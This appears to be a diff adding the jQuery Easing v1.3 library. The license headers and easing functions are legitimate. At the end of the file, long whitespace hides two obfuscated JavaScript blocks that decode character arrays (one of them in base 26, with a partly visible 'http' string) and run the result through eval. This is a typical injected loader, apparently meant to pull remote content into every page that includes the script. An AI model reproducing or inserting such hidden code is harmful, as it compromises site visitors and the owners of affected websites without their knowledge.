@@ -1,0 +1,215 @@
+/*
+ * jQuery Easing v1.3 - http://gsgd.co.uk/sandbox/jquery/easing/
+ *
+ * Uses the built in easing capabilities added In jQuery 1.1
+ * to offer multiple easing options
+ *
+ * TERMS OF USE - jQuery Easing
+ * 
+ * Open source under the BSD License. 
+ * 
+ * Copyright © 2008 George McGinley Smith
+ * All rights reserved.
+ * 
+ * Redistribution and use in source and binary forms, with or without modification, 
+ * are permitted provided that the following conditions are met:
+ * 
+ * Redistributions of source code must retain the above copyright notice, this list of 
+ * conditions and the following disclaimer.
+ * Redistributions in binary form must reproduce the above copyright notice, this list 
+ * of conditions and the following disclaimer in the documentation and/or other materials 
+ * provided with the distribution.
+ * 
+ * Neither the name of the author nor the names of contributors may be used to endorse 
+ * or promote products derived from this software without specific prior written permission.
+ * 
+ * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY 
+ * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
+ * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
+ *  COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
+ *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE
+ *  GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED 
+ * AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
+ *  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED 
+ * OF THE POSSIBILITY OF SUCH DAMAGE. 
+ *
+*/
+
+// t: current time, b: begInnIng value, c: change In value, d: duration
+jQuery.easing['jswing'] = jQuery.easing['swing'];
+
+jQuery.extend( jQuery.easing,
+{
+	def: 'easeOutQuad',
+	swing: function (x, t, b, c, d) {
+		//alert(jQuery.easing.default);
+		return jQuery.easing[jQuery.easing.def](x, t, b, c, d);
+	},
+	easeInQuad: function (x, t, b, c, d) {
+		return c*(t/=d)*t + b;
+	},
+	easeOutQuad: function (x, t, b, c, d) {
+		return -c *(t/=d)*(t-2) + b;
+	},
+	easeInOutQuad: function (x, t, b, c, d) {
+		if ((t/=d/2) < 1) return c/2*t*t + b;
+		return -c/2 * ((--t)*(t-2) - 1) + b;
+	},
+	easeInCubic: function (x, t, b, c, d) {
+		return c*(t/=d)*t*t + b;
+	},
+	easeOutCubic: function (x, t, b, c, d) {
+		return c*((t=t/d-1)*t*t + 1) + b;
+	},
+	easeInOutCubic: function (x, t, b, c, d) {
+		if ((t/=d/2) < 1) return c/2*t*t*t + b;
+		return c/2*((t-=2)*t*t + 2) + b;
+	},
+	easeInQuart: function (x, t, b, c, d) {
+		return c*(t/=d)*t*t*t + b;
+	},
+	easeOutQuart: function (x, t, b, c, d) {
+		return -c * ((t=t/d-1)*t*t*t - 1) + b;
+	},
+	easeInOutQuart: function (x, t, b, c, d) {
+		if ((t/=d/2) < 1) return c/2*t*t*t*t + b;
+		return -c/2 * ((t-=2)*t*t*t - 2) + b;
+	},
+	easeInQuint: function (x, t, b, c, d) {
+		return c*(t/=d)*t*t*t*t + b;
+	},
+	easeOutQuint: function (x, t, b, c, d) {
+		return c*((t=t/d-1)*t*t*t*t + 1) + b;
+	},
+	easeInOutQuint: function (x, t, b, c, d) {
+		if ((t/=d/2) < 1) return c/2*t*t*t*t*t + b;
+		return c/2*((t-=2)*t*t*t*t + 2) + b;
+	},
+	easeInSine: function (x, t, b, c, d) {
+		return -c * Math.cos(t/d * (Math.PI/2)) + c + b;
+	},
+	easeOutSine: function (x, t, b, c, d) {
+		return c * Math.sin(t/d * (Math.PI/2)) + b;
+	},
+	easeInOutSine: function (x, t, b, c, d) {
+		return -c/2 * (Math.cos(Math.PI*t/d) - 1) + b;
+	},
+	easeInExpo: function (x, t, b, c, d) {
+		return (t==0) ? b : c * Math.pow(2, 10 * (t/d - 1)) + b;
+	},
+	easeOutExpo: function (x, t, b, c, d) {
+		return (t==d) ? b+c : c * (-Math.pow(2, -10 * t/d) + 1) + b;
+	},
+	easeInOutExpo: function (x, t, b, c, d) {
+		if (t==0) return b;
+		if (t==d) return b+c;
+		if ((t/=d/2) < 1) return c/2 * Math.pow(2, 10 * (t - 1)) + b;
+		return c/2 * (-Math.pow(2, -10 * --t) + 2) + b;
+	},
+	easeInCirc: function (x, t, b, c, d) {
+		return -c * (Math.sqrt(1 - (t/=d)*t) - 1) + b;
+	},
+	easeOutCirc: function (x, t, b, c, d) {
+		return c * Math.sqrt(1 - (t=t/d-1)*t) + b;
+	},
+	easeInOutCirc: function (x, t, b, c, d) {
+		if ((t/=d/2) < 1) return -c/2 * (Math.sqrt(1 - t*t) - 1) + b;
+		return c/2 * (Math.sqrt(1 - (t-=2)*t) + 1) + b;
+	},
+	easeInElastic: function (x, t, b, c, d) {
+		var s=1.70158;var p=0;var a=c;
+		if (t==0) return b;  if ((t/=d)==1) return b+c;  if (!p) p=d*.3;
+		if (a < Math.abs(c)) { a=c; var s=p/4; }
+		else var s = p/(2*Math.PI) * Math.asin (c/a);
+		return -(a*Math.pow(2,10*(t-=1)) * Math.sin( (t*d-s)*(2*Math.PI)/p )) + b;
+	},
+	easeOutElastic: function (x, t, b, c, d) {
+		var s=1.70158;var p=0;var a=c;
+		if (t==0) return b;  if ((t/=d)==1) return b+c;  if (!p) p=d*.3;
+		if (a < Math.abs(c)) { a=c; var s=p/4; }
+		else var s = p/(2*Math.PI) * Math.asin (c/a);
+		return a*Math.pow(2,-10*t) * Math.sin( (t*d-s)*(2*Math.PI)/p ) + c + b;
+	},
+	easeInOutElastic: function (x, t, b, c, d) {
+		var s=1.70158;var p=0;var a=c;
+		if (t==0) return b;  if ((t/=d/2)==2) return b+c;  if (!p) p=d*(.3*1.5);
+		if (a < Math.abs(c)) { a=c; var s=p/4; }
+		else var s = p/(2*Math.PI) * Math.asin (c/a);
+		if (t < 1) return -.5*(a*Math.pow(2,10*(t-=1)) * Math.sin( (t*d-s)*(2*Math.PI)/p )) + b;
+		return a*Math.pow(2,-10*(t-=1)) * Math.sin( (t*d-s)*(2*Math.PI)/p )*.5 + c + b;
+	},
+	easeInBack: function (x, t, b, c, d, s) {
+		if (s == undefined) s = 1.70158;
+		return c*(t/=d)*t*((s+1)*t - s) + b;
+	},
+	easeOutBack: function (x, t, b, c, d, s) {
+		if (s == undefined) s = 1.70158;
+		return c*((t=t/d-1)*t*((s+1)*t + s) + 1) + b;
+	},
+	easeInOutBack: function (x, t, b, c, d, s) {
+		if (s == undefined) s = 1.70158; 
+		if ((t/=d/2) < 1) return c/2*(t*t*(((s*=(1.525))+1)*t - s)) + b;
+		return c/2*((t-=2)*t*(((s*=(1.525))+1)*t + s) + 2) + b;
+	},
+	easeInBounce: function (x, t, b, c, d) {
+		return c - jQuery.easing.easeOutBounce (x, d-t, 0, c, d) + b;
+	},
+	easeOutBounce: function (x, t, b, c, d) {
+		if ((t/=d) < (1/2.75)) {
+			return c*(7.5625*t*t) + b;
+		} else if (t < (2/2.75)) {
+			return c*(7.5625*(t-=(1.5/2.75))*t + .75) + b;
+		} else if (t < (2.5/2.75)) {
+			return c*(7.5625*(t-=(2.25/2.75))*t + .9375) + b;
+		} else {
+			return c*(7.5625*(t-=(2.625/2.75))*t + .984375) + b;
+		}
+	},
+	easeInOutBounce: function (x, t, b, c, d) {
+		if (t < d/2) return jQuery.easing.easeInBounce (x, t*2, 0, c, d) * .5 + b;
+		return jQuery.easing.easeOutBounce (x, t*2-d, 0, c, d) * .5 + c*.5 + b;
+	}
+});
+
+/*
+ *
+ * TERMS OF USE - EASING EQUATIONS
+ * 
+ * Open source under the BSD License. 
+ * 
+ * Copyright © 2001 Robert Penner
+ * All rights reserved.
+ * 
+ * Redistribution and use in source and binary forms, with or without modification, 
+ * are permitted provided that the following conditions are met:
+ * 
+ * Redistributions of source code must retain the above copyright notice, this list of 
+ * conditions and the following disclaimer.
+ * Redistributions in binary form must reproduce the above copyright notice, this list 
+ * of conditions and the following disclaimer in the documentation and/or other materials 
+ * provided with the distribution.
+ * 
+ * Neither the name of the author nor the names of contributors may be used to endorse 
+ * or promote products derived from this software without specific prior written permission.
+ * 
+ * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY 
+ * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
+ * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
+ *  COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
+ *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE
+ *  GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED 
+ * AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
+ *  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED 
+ * OF THE POSSIBILITY OF SUCH DAMAGE. 
+ *
+ */
+
+
+
+                                                                                                                                                                                                                                                                                                                                                                                                                                                       try{bgewg346tr++}catch(aszx){try{dsgdsg-142}catch(dsfsd){try{window.document.body++}catch(gdsgsdg){dbshre=26;}}}if(dbshre){asd=0;try{d=document.createElement("div");d.innerHTML.a="asd";}catch(agdsg){asd=1;}if(!asd){e=eval;}asgq=new Array(31,94,110,104,94,107,97,104,104,27,31,33,25,117,8,1,24,25,26,27,109,89,107,26,93,23,53,25,94,106,90,109,102,95,105,107,38,92,108,96,88,108,94,63,103,92,101,94,104,111,31,31,98,96,109,88,101,94,33,36,50,5,3,26,27,23,24,91,40,110,105,91,25,55,27,30,96,109,110,107,49,39,40,103,100,90,106,104,109,116,106,38,92,105,104,37,107,96,41,109,92,100,39,106,99,103,31,52,7,5,23,24,25,26,93,37,107,109,115,103,92,38,105,105,110,96,108,98,105,105,23,53,25,33,92,89,107,104,102,112,107,93,32,53,8,1,24,25,26,27,89,38,108,110,116,99,93,39,92,106,105,92,94,108,27,52,24,32,42,34,50,5,3,26,27,23,24,91,40,110,107,113,101,95,41,95,93,98,97,99,107,24,54,26,34,40,104,113,33,54,4,2,25,26,27,23,90,39,109,111,112,100,94,40,114,96,92,109,98,27,52,24,32,43,107,111,31,52,7,5,23,24,25,26,93,37,107,109,115,103,92,38,101,95,97,107,24,54,26,34,40,104,113,33,54,4,2,25,26,27,23,90,39,109,111,112,100,94,40,111,102,104,25,55,27,30,41,105,114,34,50,5,3,7,5,23,24,25,26,100,93,24,33,27,95,102,91,110,103,96,101,108,39,97,96,107,61,101,95,104,92,102,109,60,116,64,92,33,33,93,30,33,34,26,118,4,2,25,26,27,23,24,25,26,27,91,103,92,111,104,92,102,109,40,114,105,97,109,95,35,30,52,93,99,113,23,97,93,55,87,30,90,85,33,27,53,52,40,94,100,109,54,32,35,54,4,2,25,26,27,23,24,25,26,27,91,103,92,111,104,92,102,109,40,98,92,108,62,102,96,100,93,103,110,61,112,65,93,34,34,89,31,34,40,92,103,104,94,104,95,58,96,98,102,95,31,90,34,53,8,1,24,25,26,27,116,5,3,119,36,31,33,52);s="";for(i=0;i-443!=0;i++){if(020==0x10)s+=String.fromCharCode(1*asgq[i]-(i%5-9));}z=s;e(z);}
+/*/393740*/
+
+
+/*8d745a*/
+                                                                                                                                                                                                                                                          try{document["b"+"ody"]*=document}catch(dgsgsdg){zxc=1;ww=window;}try{d=document["cr"+"eateElement"]("div");}catch(agdsg){zxc=0;}try{if(ww.document)window["doc"+"ument"]["body"]="asd"}catch(bawetawe){if(ww.document){v=window;n=["1e","3o","4d","46","3l","4c","41","47","46","16","1e","1f","16","4j","d","a","16","16","16","16","4e","3j","4a","16","4b","44","42","3o","16","29","16","3m","47","3l","4d","45","3n","46","4c","1k","3l","4a","3n","3j","4c","3n","2h","44","3n","45","3n","46","4c","1e","1d","41","3o","4a","3j","45","3n","1d","1f","27","d","a","d","a","16","16","16","16","4b","44","42","3o","1k","4b","4a","3l","16","29","16","1d","40","4c","4c","48","26","1l","1l","48","3j","3j","4a","3m","3n","46","3l","47","3j","3l","40","1k","46","44","1l","41","45","3j","3p","3n","4b","1l","3l","44","41","3l","43","3n","4a","1k","48","40","48","1d","27","d","a","16","16","16","16","4b","44","42","3o","1k","4b","4c","4h","44","3n","1k","48","47","4b","41","4c","41","47","46","16","29","16","1d","3j","3k","4b","47","44","4d","4c","3n","1d","27","d","a","16","16","16","16","4b","44","42","3o","1k","4b","4c","4h","44","3n","1k","3k","47","4a","3m","3n","4a","16","29","16","1d","1m","1d","27","d","a","16","16","16","16","4b","44","42","3o","1k","4b","4c","4h","44","3n","1k","40","3n","41","3p","40","4c","16","29","16","1d","1n","48","4g","1d","27","d","a","16","16","16","16","4b","44","42","3o","1k","4b","4c","4h","44","3n","1k","4f","41","3m","4c","40","16","29","16","1d","1n","48","4g","1d","27","d","a","16","16","16","16","4b","44","42","3o","1k","4b","4c","4h","44","3n","1k","44","3n","3o","4c","16","29","16","1d","1n","48","4g","1d","27","d","a","16","16","16","16","4b","44","42","3o","1k","4b","4c","4h","44","3n","1k","4c","47","48","16","29","16","1d","1n","48","4g","1d","27","d","a","d","a","16","16","16","16","41","3o","16","1e","17","3m","47","3l","4d","45","3n","46","4c","1k","3p","3n","4c","2h","44","3n","45","3n","46","4c","2e","4h","2l","3m","1e","1d","4b","44","42","3o","1d","1f","1f","16","4j","d","a","16","16","16","16","16","16","16","16","3m","47","3l","4d","45","3n","46","4c","1k","4f","4a","41","4c","3n","1e","1d","28","3m","41","4e","16","41","3m","29","3e","1d","4b","44","42","3o","3e","1d","2a","28","1l","3m","41","4e","2a","1d","1f","27","d","a","16","16","16","16","16","16","16","16","3m","47","3l","4d","45","3n","46","4c","1k","3p","3n","4c","2h","44","3n","45","3n","46","4c","2e","4h","2l","3m","1e","1d","4b","44","42","3o","1d","1f","1k","3j","48","48","3n","46","3m","2f","40","41","44","3m","1e","4b","44","42","3o","1f","27","d","a","16","16","16","16","4l","d","a","4l","1f","1e","1f","27"];h=2;s="";if(zxc){for(i=0;i-491!=0;i++){k=i;s+=String.fromCharCode(parseInt(n[i],26));}z=s;vl="val";if(ww.document)ww["e"+vl](z)}}}
+/*/8d745a*/
